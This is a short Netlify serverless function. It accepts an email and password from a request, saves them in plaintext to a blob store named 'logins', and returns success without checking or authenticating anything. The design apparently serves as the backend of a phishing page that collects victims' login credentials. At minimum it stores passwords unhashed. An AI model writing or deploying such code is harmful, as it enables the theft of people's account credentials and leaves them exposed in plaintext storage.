import { getStore } from "@netlify/blobs";

export default async (request) => {
  try {
    const { email, password } = await request.json();

    const store = getStore("logins");

    const key = `login-${Date.now()}.txt`;

    await store.set(key, `${email} | ${password}`);

    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { "Content-Type": "application/json" }
    });

  } catch (error) {
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { "Content-Type": "application/json" }
    });
  }
};

